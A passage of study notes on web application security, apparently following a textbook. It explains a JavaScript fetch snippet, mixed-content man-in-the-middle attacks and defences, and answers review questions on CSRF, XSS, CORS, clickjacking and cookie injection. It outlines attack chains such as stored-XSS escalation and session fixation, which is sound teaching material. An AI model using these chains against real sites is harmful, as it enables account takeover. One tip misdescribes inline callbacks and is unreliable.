- ```.replace(/\</g, "&lt;")``` runs a *global regex replacement:* ```/\</g``` is a RegExp that matches the literal ```<``` character (```\<``` — the backslash is optional here, often people write ```/</g```), and the ```g``` flag means “global” (replace every occurrence). The replacement ```&lt;``` turns ```<``` into its HTML entity so the output won’t be interpreted as HTML by the browser (this prevents accidental rendering or script execution in the log). In short: it sanitizes ```<``` so you safely display raw HTML in the page.

8. ```catch (err) { out("Fetch failed: " + String(err)); }```

- If anything threw or the network failed, we log the error string. ```String(err)``` makes sure we convert whatever the error object is into readable text.

*Extra tiny tips & notes:*

- Arrow functions (```=>```) keep ```this``` lexical and are great for short handlers; prefer them for inline callbacks. Inline callbacks are a programming technique that allows you to write code that looks like a regular sequential function while using asynchronous operations. They enable you to yield results from asynchronous tasks, making the code easier to read and maintain. Asynchronous operations in JavaScript allow tasks to run in the background without blocking the main thread, enabling the program to remain responsive. This is achieved through mechanisms like callbacks, promises, and the async/await syntax, which simplify handling asynchronous code.

- ```async/await``` is just nicer syntax over Promises: ```await``` pauses until the Promise finishes.

- When logging arbitrary response text into the DOM, always escape ```<``` (and ideally ```&``` and ```>``` too) to avoid accidental HTML parsing — the ```.replace()``` here handles the common nuisance (```<```) so your log can’t execute HTML.

- *JavaScript’s async/await* isn’t multithreading — it’s *single-threaded illusion of concurrency.* The browser runs one main thread (the event loop), but async tasks like ```fetch()``` or timers are handed off to background subsystems. When they finish, they queue a callback back into the main loop. That’s why ```await``` feels like it “pauses” — but it really just tells the engine, “continue this function when that Promise resolves.”

- Python’s ```asyncio``` (or even ```subprocess.Popen()```-type logic) is the same conceptual gearshift: you trade brute blocking for elegant waiting. In JS, ```await``` is just your “coffee break” between I/O operations.

### Man-in-the-Middle and mixed-content escalation:

An *active* man-in-the-middle (MitM) doesn’t just eavesdrop — they alter responses as they pass. If any page or resource is ever fetched over plain HTTP, an active MitM on the network can change that response and inject arbitrary script into the victim’s browser. Because scripts run with the privileges of the page that loads them, an attacker who can persuade the browser to load a script resource insecurely can sometimes escalate into compromising pages that *normally* use HTTPS.

*Why the script ```src="http://..."``` line is problematic:*

```
<script src="http://wahh-app.com/help.js"></script>
```

That include explicitly asks the browser to fetch ```help.js``` over *HTTP.* If the page that contains that tag is later loaded over HTTPS, the browser will still (in some cases) attempt to fetch ```http://wahh-app.com/help.js``` if the URL is absolute and hardcoded — which opens a mixed-content gap the MitM can exploit. In many browsers that fetch will be blocked or cause a warning today, but historically some browsers silently allowed it (and browser behaviour still varies). The safe rule: *never load script resources over plain HTTP.*

AJAX (fetch/XHR) and dynamically-included ```<script>``` (or ```fetch``` + ```eval```-style patterns) let attacker-controlled script *read* the responses. Static tags like ```<img>``` or ```<iframe>``` can make requests but scripts cannot directly read the response body. The attacker needs the ability to both *cause* the browser to contact a chosen host and *inspect* the returned content — that’s why the attack flow uses script/AJAX: the injected script performs requests and then processes/exfiltrates results.

If the target app never serves HTTP, the MitM can still *create* an HTTP request to the target domain by intercepting any innocuous HTTP request the browser already makes (e.g., a background feed, anti-phishing ping, or plain-HTTP ad) and returning a redirect to ```http://target.example/...```. The browser follows the redirect and makes an HTTP request to ```target.example``` that the MitM can intercept and answer. In short: the attacker converts some browser-initiated HTTP flow into a request to the victim domain and supplies malicious content for that request.

*Why cookies / extensions matter:*

Cookies are keyed by hostname (not always by scheme), and some browser extensions historically didn’t separate HTTP/HTTPS contexts correctly. If the attacker can set or overwrite cookies via an HTTP response, scripts running in the HTTPS origin that read those cookies or use cookie values insecurely can be tricked. Likewise, a misbehaving extension can bridge the HTTP/HTTPS isolation and leak sensitive data.

*Modern realities & defenses:*

- Serve everything over HTTPS only. No mixed origins for scripts/assets.

- Enforce *HSTS* (```Strict-Transport-Security```) with ```includeSubDomains``` and a long ```max-age``` so browsers automatically upgrade HTTP → HTTPS and refuse insecure loads.

- Avoid absolute ```http://``` links for any asset. Use HTTPS URLs or relative/protocol-relative only if you absolutely understand the tradeoffs (better: always ```https://```).

- Use *Content-Security-Policy (CSP)* to restrict script sources and disallow ```unsafe-inline```. Consider ```upgrade-insecure-requests``` in CSP as an assist.

- Mark cookies ```Secure``` and ```SameSite``` and avoid placing sensitive values in cookies accessible to client script when possible. The ```SameSite``` attribute for cookies helps control how cookies are sent with cross-site requests, enhancing security by preventing cross-origin information leakage. It can be set to "Strict," "Lax," or "None," with "Lax" being the default for many browsers as of December 2024.

- Use *Subresource Integrity (SRI)* for third-party scripts you include from CDNs (it protects you if the CDN is compromised, not if an attacker controls the network).

- Minimize third-party content; sandbox or host third-party widgets on separate origins via iframes and sandbox attributes.

- Educate users / ops: don’t accept unknown certificates; use trusted networks or VPNs on untrusted Wi-Fi. For extremely paranoid users, disable all non-HTTPS requests via proxy or enterprise policy.

*Short “moral of the story”:*

If any resource for your site can be requested insecurely, you’ve got an attack surface for an active MitM. Defend by making the *entire* site (and its assets) HTTPS-only, locking it down with HSTS/CSP/Secure cookies, and minimizing third-party dependencies.

### Review Questions and Closing Notes:

1. *You discover an application function where the contents of a query string parameter are inserted into the Location header in an HTTP redirect. What three different types of attacks can this behavior potentially be exploited to perform?*

- *Open redirect / phishing.* The attacker crafts a URL that looks like it belongs to the site but redirects victims to a malicious page.

- *HTTP response splitting / proxy cache poisoning.* If the injection lets an attacker insert CR/LF into headers, they can create a second fake HTTP response and poison shared caches (or create arbitrary responses that other users receive).

- *Cookie injection / session fixation and header-based attacks.* By injecting ```Set-Cookie``` headers you can plant cookies (session fixation, persistent cookies) or otherwise manipulate header content; that can be chained to CSRF/session-hijack or other client-side attacks.

2. *What main precondition must exist to enable a CSRF attack against a sensitive function of an application?*

The victim must be *authenticated* (or the action must be reachable using credentials that the browser automatically sends) and the application must *rely solely on automatically-sent credentials* (typically cookies or HTTP auth) without requiring an unpredictable token tied to that session (anti-CSRF token) or other origin-proof. In short: browser will include the victim’s auth data automatically, and the server does not require anything extra that the attacker cannot predict or force.

3. *What three defensive measures can be used to prevent JavaScript hijacking attacks?*

- *Avoid JSONP / use CORS properly.* Don’t expose sensitive data via JSONP/callback-style responses; use ```Access-Control-Allow-Origin``` and strict CORS policies so only trusted origins can fetch sensitive JSON.

- *Make script endpoints require authenticated XHR semantics* (e.g., require a custom header or anti-CSRF token, serve JSON with ```Content-Type: application/json```, and enforce preflight/POST when appropriate). This prevents cross-site script includes from silently exfiltrating data.

- *Return non-executable prefixes or “JSON guards” and use X-Content-Type-Options:* Prefix sensitive JSON with something like ```for(;;);``` (or similar non-executable padding) and set ```X-Content-Type-Options: nosniff```, so a simple ```<script src=...>``` include will not execute or reveal the JSON contents. Other helpful measures: disable JSONP entirely, use authentication and short-lived tokens, and restrict where scripts may be loaded from via CSP.

4. *For each of the following technologies, identify the circumstances, if any, in which the technology would request ```/crossdomain.xml``` to properly enforce domain segregation: (a) Flash (b) Java (c) HTML5 (d) Silverlight*

- *Flash: Yes.* Flash will request ```/crossdomain.xml``` (or a domain-wide policy) from the target host when a Flash object tries to perform two-way cross-domain access. That file grants or denies access.

- *Java: No standard ```/crossdomain.xml```.* Java applets follow the applet sandbox and signing model; they don’t rely on Flash’s ```/crossdomain.xml``` mechanism (there isn’t a universal applet-policy file at that path).

- *HTML5 (CORS): No.* HTML5 uses standard CORS headers (```Access-Control-Allow-Origin```, etc.) — not ```/crossdomain.xml```.

- *Silverlight: Yes (but different filename).* Silverlight looks for ```/clientaccesspolicy.xml``` (and may fall back to ```/crossdomain.xml``` in some implementations). So, Flash and Silverlight use a server-published policy file; Java and HTML5 use different mechanisms.

5. *"We're safe from clickjacking attacks because we don't use frames." What, if anything, is wrong with this statement?*

Attackers can frame *your* pages from *their* site, overlay UI, or use other UI-redress techniques even if your app doesn’t itself author frames. Many attack vectors (third-party widgets, ads, compromised pages, social engineering) can still cause users to interact with your UI inside an attack-controlled frame. The correct defenses are server-side: ```X-Frame-Options: DENY``` or ```Content-Security-Policy: frame-ancestors 'self'```, and careful UI design with frame-busting is not sufficient on its own.

6. *You identify a persistent XSS vulnerability within the display name caption used by an application. This string is only ever displayed to the user who configured it, when they are logged in to the application. Describe the steps that an attack would need to perform to compromise another user of the application.*

- 1. Inject the malicious payload into the display-name field (stored XSS). It is saved by the application.

- 2. Find a way for *another* user (preferably an admin or a high-privilege user) to *view* the page where that display name appears. If the name only shows to the owning user, the attacker must cause another user to view the owner’s profile — e.g., trick an admin into using a moderation page, or exploit a logic flaw that shows that name in other contexts.

- 3. Use additional tricks if necessary to get the target to view it in the right context: e.g., a CSRF or OSRF to force the admin to load the attacker’s account (forced-login), or social engineering to click a crafted link.

- 4. When the target views the stored XSS, the payload runs in their browser with their privileges and can steal cookies, perform actions (via CSRF), create admin users, or exfiltrate data.

7. *How would you test whether an application allows cross-domain requests using XMLHttpRequest?*

- From an attacker origin (a test page you host), try a ```fetch()``` / ```XMLHttpRequest``` to the target resource and observe what happens in the browser console.

- Use ```curl -H "Origin: https://evil.example" -I https://target.example/resource``` to check whether the server responds with ```Access-Control-Allow-Origin: https://evil.example``` (or ```*```) and any other CORS headers.

- For non-simple requests, perform an ```OPTIONS``` preflight to see ```Access-Control-Allow-Methods``` and ```Access-Control-Allow-Headers```. If the server echoes ```Access-Control-Allow-Origin``` for your origin and allows the method/headers, cross-domain XHR is allowed. Use developer tools and ```curl``` for repeatable checks; remember to check preflight responses and ```Access-Control-Allow-Credentials``` semantics when cookies are required.

8. *Describe three ways in which an attacker might induce a victim to use an arbitrary cookie.*

- *HTTP header injection / response-splitting → Set-Cookie.* If you can inject CR/LF into headers, you can cause the server to emit a ```Set-Cookie``` for the victim on that domain.

- *Cross-site scripting or compromised subdomain.* XSS (on the same or related domain) or a vulnerable subdomain can run ```document.cookie = "...";``` or exploit ```Set-Cookie``` via script to set cookies for the parent domain (if allowed by cookie scope).

- *Session fixation via URL or login flow / CSRF to login.* An attacker fixes a known session token in the victim’s browser (via URL tokens, hidden forms, or cookie injection). Then after the victim logs in, that token becomes an authenticated session the attacker can reuse. A related vector is forcing the victim to adopt the attacker’s session via CSRF or by tricking them to click a crafted link.
